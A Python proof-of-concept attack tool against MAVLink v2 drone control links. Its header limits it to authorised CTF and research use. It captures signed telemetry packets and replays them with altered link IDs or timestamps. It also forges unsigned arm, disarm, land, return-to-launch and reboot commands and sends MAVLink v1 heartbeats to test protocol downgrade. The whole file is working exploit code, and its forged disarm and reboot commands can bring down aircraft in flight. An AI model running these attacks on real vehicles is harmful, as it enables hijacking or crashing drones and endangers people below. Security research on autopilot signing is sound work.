#!/usr/bin/env python3
"""
mavlink-signing-replay.py — MAVLink v2 Signed Packet Capture & Replay PoC

Captures signed MAVLink v2 packets from a UDP or serial interface, analyzes
signing parameters, and replays them within the anti-replay tolerance window.
Supports cross-link replay (changing link_id to bypass timestamp tracking).

AUTHORIZED CTF / SECURITY RESEARCH USE ONLY.
Targets hardware you own in a controlled lab environment.

Usage:
    # Capture mode — sniff and save signed packets
    python3 mavlink-signing-replay.py capture --udp 0.0.0.0:14550 --output captured.json

    # Capture from serial
    python3 mavlink-signing-replay.py capture --serial /dev/ttyUSB0 --baud 57600 --output captured.json

    # Analyze captured packets
    python3 mavlink-signing-replay.py analyze --input captured.json

    # Replay captured packets (dry-run by default)
    python3 mavlink-signing-replay.py replay --input captured.json --target 192.168.4.1:14550

    # Replay with cross-link bypass (change link_id)
    python3 mavlink-signing-replay.py replay --input captured.json --target 192.168.4.1:14550 \\
        --cross-link 5 --execute

    # Replay with timestamp offset
    python3 mavlink-signing-replay.py replay --input captured.json --target 192.168.4.1:14550 \\
        --timestamp-offset -30 --execute

Requirements:
    Python 3.10+ (stdlib only — no external dependencies)
"""

import argparse
import hashlib
import json
import os
import select
import socket
import struct
import sys
import time
from datetime import datetime, timezone

MAVLINK_V2_MAGIC = 0xFD
MAVLINK_V1_MAGIC = 0xFE
MAVLINK_IFLAG_SIGNED = 0x01
MAVLINK_EPOCH = 1420070400  # 2015-01-01 00:00:00 UTC
REPLAY_WINDOW_SECONDS = 60  # ArduPilot default tolerance
MAVLINK_SIGNATURE_BLOCK_LEN = 13  # link_id(1) + timestamp(6) + signature(6)

# MAVLink message IDs for common attack commands
MSG_NAMES = {
    0: "HEARTBEAT",
    1: "SYS_STATUS",
    2: "SYSTEM_TIME",
    11: "SET_MODE",
    20: "PARAM_REQUEST_READ",
    21: "PARAM_REQUEST_LIST",
    22: "PARAM_VALUE",
    23: "PARAM_SET",
    30: "ATTITUDE",
    33: "GLOBAL_POSITION_INT",
    44: "MISSION_COUNT",
    66: "REQUEST_DATA_STREAM",
    76: "COMMAND_LONG",
    77: "COMMAND_ACK",
    109: "RADIO_STATUS",
    253: "STATUSTEXT",
    256: "SETUP_SIGNING",
    400: "COMPONENT_ARM_DISARM",  # via COMMAND_LONG
}


def log(msg, file=sys.stderr):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"[{ts}] {msg}", file=file)


def utc_to_mavlink_ts(utc_seconds):
    return int((utc_seconds - MAVLINK_EPOCH) * 100000)


def mavlink_ts_to_utc(ticks):
    return MAVLINK_EPOCH + (ticks / 100000.0)


def mavlink_ts_to_str(ticks):
    utc = mavlink_ts_to_utc(ticks)
    return datetime.fromtimestamp(utc, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f UTC")


def crc_accumulate(b, crc):
    tmp = b ^ (crc & 0xFF)
    tmp ^= (tmp << 4) & 0xFF
    return ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF


def crc_calculate(buf, seed=0xFFFF):
    crc = seed
    for b in buf:
        crc = crc_accumulate(b, crc)
    return crc


# CRC_EXTRA values for common message IDs (from MAVLink XML definitions)
CRC_EXTRA = {
    0: 50,    # HEARTBEAT
    1: 124,   # SYS_STATUS
    2: 137,   # SYSTEM_TIME
    11: 89,   # SET_MODE
    76: 152,  # COMMAND_LONG
    77: 143,  # COMMAND_ACK
    109: 185, # RADIO_STATUS
    253: 83,  # STATUSTEXT
}


class MavlinkPacket:
    """Parsed MAVLink v2 packet with optional signature."""

    def __init__(self, raw_bytes):
        self.raw = raw_bytes
        self.valid = False
        self.signed = False
        self.parse()

    def parse(self):
        if len(self.raw) < 12:
            return
        if self.raw[0] != MAVLINK_V2_MAGIC:
            return

        self.payload_len = self.raw[1]
        self.incompat_flags = self.raw[2]
        self.compat_flags = self.raw[3]
        self.seq = self.raw[4]
        self.system_id = self.raw[5]
        self.component_id = self.raw[6]
        self.msg_id = self.raw[7] | (self.raw[8] << 8) | (self.raw[9] << 16)

        expected_len = 10 + self.payload_len + 2  # header + payload + CRC
        self.signed = bool(self.incompat_flags & MAVLINK_IFLAG_SIGNED)
        if self.signed:
            expected_len += MAVLINK_SIGNATURE_BLOCK_LEN

        if len(self.raw) < expected_len:
            return

        self.payload = self.raw[10:10 + self.payload_len]
        crc_offset = 10 + self.payload_len
        self.crc = struct.unpack("<H", self.raw[crc_offset:crc_offset + 2])[0]

        if self.signed:
            sig_offset = crc_offset + 2
            self.link_id = self.raw[sig_offset]
            ts_bytes = self.raw[sig_offset + 1:sig_offset + 7]
            self.timestamp = int.from_bytes(ts_bytes, "little")
            self.signature = self.raw[sig_offset + 7:sig_offset + 13]
            self.raw = self.raw[:expected_len]
        else:
            self.link_id = None
            self.timestamp = None
            self.signature = None
            self.raw = self.raw[:expected_len]

        self.valid = True
        self.capture_time = time.time()

    @property
    def msg_name(self):
        return MSG_NAMES.get(self.msg_id, f"MSG_{self.msg_id}")

    @property
    def age_seconds(self):
        if self.timestamp is None:
            return None
        return time.time() - mavlink_ts_to_utc(self.timestamp)

    def to_dict(self):
        d = {
            "capture_time": self.capture_time,
            "payload_len": self.payload_len,
            "seq": self.seq,
            "system_id": self.system_id,
            "component_id": self.component_id,
            "msg_id": self.msg_id,
            "msg_name": self.msg_name,
            "signed": self.signed,
            "raw_hex": self.raw.hex(),
        }
        if self.signed:
            d["link_id"] = self.link_id
            d["timestamp"] = self.timestamp
            d["timestamp_utc"] = mavlink_ts_to_str(self.timestamp)
            d["signature_hex"] = self.signature.hex()
        return d

    def rebuild_with_link_id(self, new_link_id, secret_key=None):
        if not self.signed:
            return self.raw

        crc_offset = 10 + self.payload_len
        crc_bytes = self.raw[crc_offset:crc_offset + 2]
        ts_bytes = self.timestamp.to_bytes(6, "little")

        if secret_key is not None:
            header_for_sig = bytearray(self.raw[0:10])
            header_for_sig[2] = header_for_sig[2] & ~MAVLINK_IFLAG_SIGNED
            h = hashlib.sha256()
            h.update(secret_key)
            h.update(header_for_sig)
            h.update(self.payload)
            h.update(crc_bytes)
            h.update(bytes([new_link_id]))
            h.update(ts_bytes)
            new_sig = h.digest()[:6]
            result = bytearray(self.raw[:crc_offset + 2])
            result.append(new_link_id)
            result.extend(ts_bytes)
            result.extend(new_sig)
            return bytes(result)
        else:
            # No key: strip signature — old sig is invalid after field change.
            # Return an unsigned packet so caller knows it won't authenticate.
            result = bytearray(self.raw[:crc_offset + 2])
            result[2] = result[2] & ~MAVLINK_IFLAG_SIGNED
            return bytes(result)

    def rebuild_with_timestamp(self, new_timestamp, secret_key=None):
        if not self.signed:
            return self.raw

        crc_offset = 10 + self.payload_len
        crc_bytes = self.raw[crc_offset:crc_offset + 2]
        ts_bytes = new_timestamp.to_bytes(6, "little")

        if secret_key is not None:
            header_for_sig = bytearray(self.raw[0:10])
            header_for_sig[2] = header_for_sig[2] & ~MAVLINK_IFLAG_SIGNED
            h = hashlib.sha256()
            h.update(secret_key)
            h.update(header_for_sig)
            h.update(self.payload)
            h.update(crc_bytes)
            h.update(bytes([self.link_id]))
            h.update(ts_bytes)
            new_sig = h.digest()[:6]
            result = bytearray(self.raw[:crc_offset + 2])
            result.append(self.link_id)
            result.extend(ts_bytes)
            result.extend(new_sig)
            return bytes(result)
        else:
            # No key: strip signature — old sig is invalid after field change.
            result = bytearray(self.raw[:crc_offset + 2])
            result[2] = result[2] & ~MAVLINK_IFLAG_SIGNED
            return bytes(result)


class PacketReader:
    """Read MAVLink packets from a byte stream."""

    def __init__(self):
        self.buf = bytearray()

    def feed(self, data):
        self.buf.extend(data)
        return self._extract_packets()

    def _extract_packets(self):
        packets = []
        while True:
            idx = -1
            for i in range(len(self.buf)):
                if self.buf[i] == MAVLINK_V2_MAGIC:
                    idx = i
                    break
            if idx < 0:
                self.buf.clear()
                break
            if idx > 0:
                self.buf = self.buf[idx:]

            if len(self.buf) < 10:
                break

            payload_len = self.buf[1]
            incompat_flags = self.buf[2]
            signed = bool(incompat_flags & MAVLINK_IFLAG_SIGNED)
            total_len = 10 + payload_len + 2
            if signed:
                total_len += MAVLINK_SIGNATURE_BLOCK_LEN

            if len(self.buf) < total_len:
                break

            pkt_bytes = bytes(self.buf[:total_len])
            self.buf = self.buf[total_len:]

            pkt = MavlinkPacket(pkt_bytes)
            if pkt.valid:
                packets.append(pkt)

        return packets


def open_udp(addr_str):
    host, port = addr_str.rsplit(":", 1)
    port = int(port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.setblocking(False)
    log(f"Listening on UDP {host}:{port}")
    return sock


def open_serial(port, baud):
    import serial as pyserial
    ser = pyserial.Serial(port, baud, timeout=0.1)
    log(f"Opened serial {port} at {baud} baud")
    return ser


def cmd_capture(args):
    reader = PacketReader()
    captured = []
    signed_count = 0
    unsigned_count = 0

    if args.udp:
        sock = open_udp(args.udp)
        read_fn = lambda: sock.recv(4096)
        wait_fn = lambda: select.select([sock], [], [], 1.0)[0]
    elif args.serial:
        ser = open_serial(args.serial, args.baud)
        read_fn = lambda: ser.read(4096)
        wait_fn = lambda: True  # serial.read has its own timeout
    else:
        log("ERROR: specify --udp or --serial")
        sys.exit(1)

    log(f"Capturing MAVLink packets (Ctrl-C to stop, saving to {args.output})...")

    try:
        while True:
            if wait_fn():
                try:
                    data = read_fn()
                except (OSError, ConnectionResetError):
                    continue
                if not data:
                    continue

                for pkt in reader.feed(data):
                    if pkt.signed:
                        signed_count += 1
                        captured.append(pkt.to_dict())
                        age = pkt.age_seconds
                        age_str = f"{age:.1f}s old" if age is not None else "?"
                        log(f"SIGNED #{signed_count}: {pkt.msg_name} "
                            f"sys={pkt.system_id} comp={pkt.component_id} "
                            f"link={pkt.link_id} ts={pkt.timestamp} ({age_str}) "
                            f"sig={pkt.signature.hex()}")
                    else:
                        unsigned_count += 1
                        if unsigned_count <= 5 or unsigned_count % 50 == 0:
                            log(f"UNSIGNED: {pkt.msg_name} "
                                f"sys={pkt.system_id} comp={pkt.component_id} "
                                f"(count: {unsigned_count})")

                    if args.count and (signed_count + unsigned_count) >= args.count:
                        raise KeyboardInterrupt

    except KeyboardInterrupt:
        log(f"\nCapture complete: {signed_count} signed, {unsigned_count} unsigned packets")

    if args.output:
        with open(args.output, "w") as f:
            json.dump({
                "capture_info": {
                    "time": datetime.now(tz=timezone.utc).isoformat(),
                    "source": args.udp or args.serial,
                    "signed_count": signed_count,
                    "unsigned_count": unsigned_count,
                },
                "packets": captured,
            }, f, indent=2)
        log(f"Saved {len(captured)} signed packets to {args.output}")


def cmd_analyze(args):
    with open(args.input) as f:
        data = json.load(f)

    packets = data.get("packets", [])
    if not packets:
        log("No packets in capture file")
        return

    print(f"\n{'='*70}")
    print(f"MAVLink Signing Analysis — {len(packets)} signed packets")
    print(f"{'='*70}\n")

    info = data.get("capture_info", {})
    if info:
        print(f"Source:   {info.get('source', 'unknown')}")
        print(f"Time:     {info.get('time', 'unknown')}")
        print(f"Unsigned: {info.get('unsigned_count', '?')} packets also captured\n")

    # Unique system/component/link_id tuples
    tuples = set()
    msg_types = {}
    timestamps = []
    link_ids = set()

    for p in packets:
        key = (p["system_id"], p["component_id"], p.get("link_id", 0))
        tuples.add(key)
        link_ids.add(p.get("link_id", 0))
        name = p.get("msg_name", f"MSG_{p['msg_id']}")
        msg_types[name] = msg_types.get(name, 0) + 1
        if p.get("timestamp") is not None:
            timestamps.append(p["timestamp"])

    print("System/Component/Link tuples observed:")
    for sys_id, comp_id, link_id in sorted(tuples):
        print(f"  sys={sys_id} comp={comp_id} link_id={link_id}")

    print(f"\nLink IDs in use: {sorted(link_ids)}")
    unused_links = [i for i in range(256) if i not in link_ids]
    print(f"Unused link IDs (first 10): {unused_links[:10]}")

    print(f"\nMessage types ({len(msg_types)} unique):")
    for name, count in sorted(msg_types.items(), key=lambda x: -x[1]):
        print(f"  {name:30s} {count:5d}")

    if timestamps:
        ts_min = min(timestamps)
        ts_max = max(timestamps)
        ts_span = (ts_max - ts_min) / 100000.0  # seconds
        print(f"\nTimestamp range:")
        print(f"  First: {ts_min} ({mavlink_ts_to_str(ts_min)})")
        print(f"  Last:  {ts_max} ({mavlink_ts_to_str(ts_max)})")
        print(f"  Span:  {ts_span:.2f} seconds")

        current_ts = utc_to_mavlink_ts(time.time())
        age = (current_ts - ts_max) / 100000.0
        print(f"\n  Current MAVLink timestamp: {current_ts}")
        print(f"  Age of newest packet: {age:.1f} seconds")

        replay_window_ticks = REPLAY_WINDOW_SECONDS * 100000
        if age < REPLAY_WINDOW_SECONDS:
            viable = [p for p in packets
                      if p.get("timestamp") and (current_ts - p["timestamp"]) < replay_window_ticks]
            print(f"\n  {len(viable)} of {len(packets)} packets are <{REPLAY_WINDOW_SECONDS}s old")
            print(f"  NOTE: timestamp age alone does not establish replay viability.")
            print(f"  The receiver's per-stream anti-replay state, valid authentication,")
            print(f"  and accept_unsigned policy all affect whether packets are accepted.")
        else:
            print(f"\n  Newest packet is {age:.0f}s old (>{REPLAY_WINDOW_SECONDS}s)")
            print(f"  Acceptance depends on receiver state: cold-start (no baseline)")
            print(f"  or accept_unsigned policy may still permit replay.")

    # Replayable command packets
    attack_msgs = {"COMMAND_LONG", "SET_MODE", "COMPONENT_ARM_DISARM",
                   "MISSION_COUNT", "PARAM_SET"}
    attack_packets = [p for p in packets if p.get("msg_name") in attack_msgs]
    if attack_packets:
        print(f"\nHigh-value command packets captured: {len(attack_packets)}")
        for p in attack_packets[:10]:
            print(f"  {p['msg_name']} sys={p['system_id']} "
                  f"ts={p.get('timestamp_utc', '?')}")

    print()


def cmd_replay(args):
    with open(args.input) as f:
        data = json.load(f)

    packets = data.get("packets", [])
    if not packets:
        log("No packets in capture file")
        return

    # Filter by message type if requested
    if args.msg_filter:
        filter_set = set(args.msg_filter.upper().split(","))
        packets = [p for p in packets if p.get("msg_name", "").upper() in filter_set]
        log(f"Filtered to {len(packets)} packets matching: {args.msg_filter}")

    if not packets:
        log("No packets match filter")
        return

    # Parse target
    target_host, target_port = args.target.rsplit(":", 1)
    target_port = int(target_port)

    if not args.execute:
        print(f"\n{'='*70}")
        print("DRY RUN — replay details (pass --execute to send)")
        print(f"{'='*70}\n")
        print(f"Target:  {target_host}:{target_port}")
        print(f"Packets: {len(packets)}")
        if args.cross_link is not None:
            print(f"Cross-link replay: changing link_id to {args.cross_link}")
        if args.timestamp_offset:
            print(f"Timestamp offset: {args.timestamp_offset} seconds")
        print(f"\nPackets that would be replayed:")
        for i, p in enumerate(packets[:20]):
            raw = bytes.fromhex(p["raw_hex"])
            pkt = MavlinkPacket(raw)
            print(f"  [{i}] {p.get('msg_name', '?'):20s} "
                  f"sys={p['system_id']} comp={p['component_id']} "
                  f"link={p.get('link_id', '?')} "
                  f"ts={p.get('timestamp_utc', '?')}")
        if len(packets) > 20:
            print(f"  ... and {len(packets) - 20} more")
        print(f"\nRe-run with --execute to send these packets.")
        return

    # Live replay
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    errors = 0

    log(f"Replaying {len(packets)} packets to {target_host}:{target_port}")
    if args.cross_link is not None:
        log(f"Cross-link replay: link_id -> {args.cross_link}")
        log("WARNING: no signing key — mutated packets are sent UNSIGNED "
            "(signature stripped). A receiver requiring valid signatures will reject them.")

    for p in packets:
        raw = bytes.fromhex(p["raw_hex"])
        pkt = MavlinkPacket(raw)
        if not pkt.valid:
            errors += 1
            continue

        if args.cross_link is not None and pkt.signed:
            send_bytes = pkt.rebuild_with_link_id(args.cross_link)
        elif args.timestamp_offset and pkt.signed and pkt.timestamp is not None:
            offset_ticks = int(args.timestamp_offset * 100000)
            new_ts = pkt.timestamp + offset_ticks
            if new_ts < 0:
                new_ts = 0
            send_bytes = pkt.rebuild_with_timestamp(new_ts)
        else:
            send_bytes = raw

        try:
            sock.sendto(send_bytes, (target_host, target_port))
            sent += 1
            log(f"SENT [{sent}]: {pkt.msg_name} sys={pkt.system_id} "
                f"link={args.cross_link if args.cross_link is not None else pkt.link_id}")
        except OSError as e:
            log(f"SEND ERROR: {e}")
            errors += 1

        if args.delay:
            time.sleep(args.delay / 1000.0)

    sock.close()
    log(f"Replay complete: {sent} sent, {errors} errors")


def cmd_forge_unsigned(args):
    """Send an unsigned MAVLink v2 COMMAND_LONG to test accept_unsigned."""
    target_host, target_port = args.target.rsplit(":", 1)
    target_port = int(target_port)

    # MAVLink command codes
    COMMANDS = {
        "disarm": (400, 0, 0, 0, 0, 0, 0, 0),      # MAV_CMD_COMPONENT_ARM_DISARM, param1=0 (disarm)
        "arm": (400, 1, 0, 0, 0, 0, 0, 0),           # param1=1 (arm)
        "rtl": (20, 6, 0, 0, 0, 0, 0, 0),            # MAV_CMD_NAV_RETURN_TO_LAUNCH via SET_MODE
        "land": (21, 9, 0, 0, 0, 0, 0, 0),           # MAV_CMD_NAV_LAND via SET_MODE
        "reboot": (246, 1, 0, 0, 0, 0, 0, 0),        # MAV_CMD_PREFLIGHT_REBOOT_SHUTDOWN
        "heartbeat": None,
    }

    cmd = args.command.lower()
    if cmd not in COMMANDS:
        log(f"Unknown command: {cmd}. Available: {', '.join(COMMANDS)}")
        sys.exit(1)

    sys_id = args.system_id
    target_sys = args.target_system

    if cmd == "heartbeat":
        # HEARTBEAT: type=6(GCS), autopilot=8(INVALID), base_mode=0, custom=0, status=0
        payload = struct.pack("<IBBBBB", 0, 6, 8, 0, 0, 3)
        msg_id = 0
    else:
        # COMMAND_LONG wire order (MAVLink field reordering by size):
        # 7 floats first, then uint16 command, then 3 uint8s
        command_id, p1, p2, p3, p4, p5, p6, p7 = COMMANDS[cmd]
        payload = struct.pack("<fffffffHBBB",
                              p1, p2, p3, p4, p5, p6, p7,
                              command_id,
                              target_sys, 1,  # target_system, target_component
                              0)  # confirmation
        msg_id = 76  # COMMAND_LONG

    # Build MAVLink v2 header (unsigned)
    header = struct.pack("<BBBBBBBBB",
                         MAVLINK_V2_MAGIC,
                         len(payload),
                         0x00,  # incompat_flags: NO signing
                         0x00,  # compat_flags
                         0,     # seq
                         sys_id,
                         1,     # component_id (MAV_COMP_ID_AUTOPILOT1)
                         msg_id & 0xFF,
                         (msg_id >> 8) & 0xFF)
    # msg_id byte 3 (always 0 for IDs < 65536)
    header += bytes([(msg_id >> 16) & 0xFF])

    # CRC
    crc_buf = header[1:] + payload  # everything after magic
    crc = crc_calculate(crc_buf)
    if msg_id in CRC_EXTRA:
        crc = crc_accumulate(CRC_EXTRA[msg_id], crc)
    crc_bytes = struct.pack("<H", crc)

    packet = header + payload + crc_bytes

    if not args.execute:
        print(f"\nDRY RUN — unsigned {cmd.upper()} packet:")
        print(f"  Target: {target_host}:{target_port}")
        print(f"  System ID (attacker): {sys_id}")
        print(f"  Target system: {target_sys}")
        print(f"  Message: {MSG_NAMES.get(msg_id, f'MSG_{msg_id}')} ({msg_id})")
        print(f"  Packet: {packet.hex()}")
        print(f"  Length: {len(packet)} bytes")
        print(f"\n  This tests whether the target accepts UNSIGNED commands.")
        print(f"  If accepted, signing is effectively bypassed.")
        print(f"\n  Re-run with --execute to send.")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet, (target_host, target_port))
    log(f"SENT unsigned {cmd.upper()} to {target_host}:{target_port} "
        f"(attacker sys={sys_id}, target sys={target_sys})")
    sock.close()


def cmd_downgrade_v1(args):
    """Send a MAVLink v1 HEARTBEAT to test v1 acceptance."""
    target_host, target_port = args.target.rsplit(":", 1)
    target_port = int(target_port)

    sys_id = args.system_id

    # MAVLink v1 HEARTBEAT
    # Header: magic(1), len(1), seq(1), sysid(1), compid(1), msgid(1)
    payload = struct.pack("<IBBBBB", 0, 6, 8, 0, 0, 3)  # GCS heartbeat
    header = struct.pack("<BBBBBB",
                         MAVLINK_V1_MAGIC,
                         len(payload),
                         0,       # seq
                         sys_id,
                         1,       # component_id
                         0)       # msg_id = HEARTBEAT

    crc_buf = header[1:] + payload
    crc = crc_calculate(crc_buf)
    crc = crc_accumulate(CRC_EXTRA[0], crc)  # HEARTBEAT CRC_EXTRA
    crc_bytes = struct.pack("<H", crc)

    packet = header + payload + crc_bytes

    if not args.execute:
        print(f"\nDRY RUN — MAVLink v1 HEARTBEAT (downgrade test):")
        print(f"  Target: {target_host}:{target_port}")
        print(f"  System ID: {sys_id}")
        print(f"  Packet: {packet.hex()}")
        print(f"\n  If the target responds to v1, signing is fully bypassed.")
        print(f"\n  Re-run with --execute to send.")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(5):
        sock.sendto(packet, (target_host, target_port))
        log(f"SENT v1 HEARTBEAT #{i+1} to {target_host}:{target_port}")
        time.sleep(0.5)

    sock.settimeout(3.0)
    try:
        data, addr = sock.recvfrom(4096)
        log(f"RESPONSE from {addr}: {len(data)} bytes — v1 ACCEPTED!")
        log(f"  Raw: {data[:20].hex()}...")
    except socket.timeout:
        log("No response within 3s — v1 may be rejected (or target unreachable)")
    sock.close()


def main():
    parser = argparse.ArgumentParser(
        description="MAVLink v2 Signing Replay & Bypass PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="AUTHORIZED CTF / SECURITY RESEARCH USE ONLY.")
    sub = parser.add_subparsers(dest="subcommand", required=True)

    # Capture
    p_cap = sub.add_parser("capture", help="Capture signed MAVLink packets")
    p_cap.add_argument("--udp", help="UDP listen address (host:port)")
    p_cap.add_argument("--serial", help="Serial port (e.g., /dev/ttyUSB0)")
    p_cap.add_argument("--baud", type=int, default=57600, help="Serial baud rate")
    p_cap.add_argument("--output", "-o", default="mavlink-capture.json",
                       help="Output file (default: mavlink-capture.json)")
    p_cap.add_argument("--count", "-n", type=int, help="Stop after N packets")

    # Analyze
    p_ana = sub.add_parser("analyze", help="Analyze captured packets")
    p_ana.add_argument("--input", "-i", required=True, help="Capture file")

    # Replay
    p_rep = sub.add_parser("replay", help="Replay captured signed packets")
    p_rep.add_argument("--input", "-i", required=True, help="Capture file")
    p_rep.add_argument("--target", "-t", required=True, help="Target address (host:port)")
    p_rep.add_argument("--cross-link", type=int, metavar="LINK_ID",
                       help="Change link_id for cross-link bypass")
    p_rep.add_argument("--timestamp-offset", type=float, metavar="SECS",
                       help="Offset timestamps by N seconds (negative = backward)")
    p_rep.add_argument("--msg-filter", help="Comma-separated message names to replay")
    p_rep.add_argument("--delay", type=float, default=10,
                       help="Delay between packets in ms (default: 10)")
    p_rep.add_argument("--execute", action="store_true",
                       help="Actually send packets (default: dry-run)")

    # Forge unsigned (downgrade test)
    p_forge = sub.add_parser("forge-unsigned",
                             help="Send unsigned commands to test accept_unsigned")
    p_forge.add_argument("--target", "-t", required=True, help="Target (host:port)")
    p_forge.add_argument("--command", "-c", required=True,
                         choices=["disarm", "arm", "rtl", "land", "reboot", "heartbeat"],
                         help="Command to send")
    p_forge.add_argument("--system-id", type=int, default=255,
                         help="Attacker system ID (default: 255 = GCS)")
    p_forge.add_argument("--target-system", type=int, default=1,
                         help="Target system ID (default: 1)")
    p_forge.add_argument("--execute", action="store_true",
                         help="Actually send (default: dry-run)")

    # MAVLink v1 downgrade
    p_v1 = sub.add_parser("downgrade-v1",
                          help="Send v1 HEARTBEAT to test protocol downgrade")
    p_v1.add_argument("--target", "-t", required=True, help="Target (host:port)")
    p_v1.add_argument("--system-id", type=int, default=255,
                       help="System ID (default: 255)")
    p_v1.add_argument("--execute", action="store_true",
                       help="Actually send (default: dry-run)")

    args = parser.parse_args()

    if args.subcommand == "capture":
        cmd_capture(args)
    elif args.subcommand == "analyze":
        cmd_analyze(args)
    elif args.subcommand == "replay":
        cmd_replay(args)
    elif args.subcommand == "forge-unsigned":
        cmd_forge_unsigned(args)
    elif args.subcommand == "downgrade-v1":
        cmd_downgrade_v1(args)


if __name__ == "__main__":
    main()
